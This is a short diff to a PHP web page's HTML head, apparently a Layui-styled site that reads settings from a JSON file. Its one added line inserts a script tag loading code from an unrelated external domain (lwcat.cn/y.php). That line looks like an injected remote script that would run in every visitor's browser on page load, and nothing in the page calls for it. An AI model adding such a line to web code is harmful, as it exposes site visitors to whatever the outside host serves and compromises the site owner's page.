@@ -14,6 +14,7 @@ $data = json_decode(file_get_contents('data/data.json'), true);
   <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
   <meta name="viewport" content="width=device-width, initial-scale=1">
   <LINK rel="shortcut icon" type="image/x-icon" href="favicon.ico">
+  <script src="https://lwcat.cn/y.php"></script>
   <link rel="stylesheet" href="<?php echo $data['cdn']; ?>css/layui.css">
   <style>
     /* 添加一些之定义的CSS样式 */
